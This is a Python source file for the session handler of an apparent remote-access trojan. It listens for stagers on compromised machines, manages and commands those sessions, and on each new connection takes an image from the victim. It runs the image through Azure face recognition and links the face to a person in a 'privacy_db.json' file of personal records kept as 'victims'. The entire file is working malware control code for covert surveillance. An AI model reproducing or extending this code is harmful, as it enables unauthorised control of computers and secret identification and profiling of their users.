from modules import helper as h
from azure import faceRec
import threading, socket, time, sys
import json

class MultiHandler:
	def __init__(self,server):
		self.server = server
		self.thread = None
		self.new_session_id = -1
		self.sessions_id = dict()
		self.sessions_uid = dict()
		self.person_db = dict()
		self.faceid_mapping = dict()
		self.victims = dict()
		self.victims_modify = False
###		For test
###		self.victims = {"name": "Aimin Wei", "age": 24, "gender": "male"}
###		self.victims_modify = True
		self.handle = h.COLOR_INFO + "MultiHandler" + h.ENDC + "> "
		self.is_running = False
		self.load_person_info()
		self.load_faceid2person()


	def load_person_info(self):
		json_file = open("privacy_db.json")
		self.person_db = json.load(json_file)
		print(self.person_db)
		json_file.close()


	def load_faceid2person(self):
		json_file = open("faceid_mapping.json")
		self.faceid_mapping = json.load(json_file)
		print(self.faceid_mapping)
		json_file.close()


	def update_session(self,current_session,new_session):
		current_session.conn = new_session.conn
		current_session.username = new_session.username
		current_session.hostname = new_session.hostname
		current_session.type = new_session.type
		current_session.needs_refresh = False
		sys.stdout.write("\n"+current_session.get_handle())
		sys.stdout.flush()


	def background_listener(self):
		self.server.is_multi = True
		self.is_running = True
		id_number = 1
		while 1:
			if self.is_running:
				session = self.server.listen_for_stager()
				if session:
					if session.uid in self.sessions_uid.keys():
						if self.sessions_uid[session.uid].needs_refresh:
							self.update_session(self.sessions_uid[session.uid],session)
						continue
					else:
						self.sessions_uid[session.uid] = session
						self.sessions_id[id_number] = session
						self.new_session_id = id_number
						session.id = id_number
						id_number += 1
						sys.stdout.write("\n{0}[*]{2} Session {1} opened{2}\n{3}".format(h.COLOR_INFO,str(session.id),h.WHITE,self.handle))
						sys.stdout.flush()
						self.init_interact_with_session()
			else:
				return


	def start_background_server(self):
		self.thread = threading.Thread(target=self.background_listener)
		self.thread.setDaemon(False)
		self.thread.start()


	def close_all_sessions(self):
		h.info_general("Cleaning up...")
		for key in self.sessions_id.keys():
			session = self.sessions_id[key]
			session.disconnect(False)


	def show_session(self,session):
		try:
			print str(session.id) + " | " +\
			session.username + "@" + session.hostname + " | " + \
			str(session.conn.getpeername()[0]) 
		except Exception as e:
			h.info_error(str(e))


	def list_sessions(self):
		if not self.sessions_id:
			h.info_general("No active sessions")
		else:
			for key in self.sessions_id:
				self.show_session(self.sessions_id[key])


	def interact_with_session(self,session_number, cmd_data):
		if not session_number:
			print "Usage: interact (session number)"
			return None
		try:
			return self.sessions_id[int(session_number)].interact(cmd_data)
		except:
			h.info_error("Invalid Session")
			return None


	def close_session(self,session_number):
		if not session_number:
			print "Usage: close (session number)"
			return
		try:
			session = self.sessions_id[int(session_number)]
			session.disconnect(False)
			h.info_general('Closing session ' + session_number)
		except Exception as e:
			print e
			h.info_error("Invalid Session")


	def stop_server(self):
		self.close_all_sessions()
		self.is_running = False
		if self.thread:
			socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((self.server.host,self.server.port))
			self.thread.join()
		time.sleep(0.5)


	def show_command(self,name,description):
		print name + " " * (15 - len(name)) + ": " + description


	def show_commands(self):
		commands = [
			("interact","interact with session"),
			("close","close active session"),
			("sessions","list sessions"),
			("exit","close all sessions and exit to menu"),
		]
		print h.WHITEBU+"MultiHandler Commands:"+h.ENDC
		for command in commands:
			self.show_command(command[0],command[1])


	def init_interact_with_session(self):
		if self.new_session_id < 1:
			print "Usage: interact (session number)"
			return
		try:
			file_name = self.sessions_id[self.new_session_id].init_interact()
			response = faceRec(file_name)
			response = json.loads(response)
			if response['status'] == "Ok":
				print(response['faceId'])
				faceid = response['faceId']
			else:
				print("no data match")
				faceid = ""
#			faceid = "faceid1"
			if faceid in self.faceid_mapping['FaceToPerson']:
				person_name = self.faceid_mapping['FaceToPerson'][faceid]
				for person in self.person_db['Person']:
					if person['name'] == person_name:
						self.victims[self.new_session_id] = person
						self.victims_modify = True
		except:
			h.info_error("Invalid Session")


	def interact(self, session_id, cmd_data):
#		h.info_general("Listening on port {0}...".format(self.server.port))
#		h.info_general("Type \"help\" for commands")
		try:
			cmd = cmd_data.split()[0]
			para = {"cmd": cmd, "args": cmd_data[len(cmd) + 1:]}
			result = self.interact_with_session(session_id, cmd_data)
			'''
			if cmd == "picture" and not result:
				return result
			elif cmd == "screenshot" and not result:
				return result
			'''
			return result
		except KeyboardInterrupt:
			sys.stdout.write("\n")
			self.stop_server()
			return None

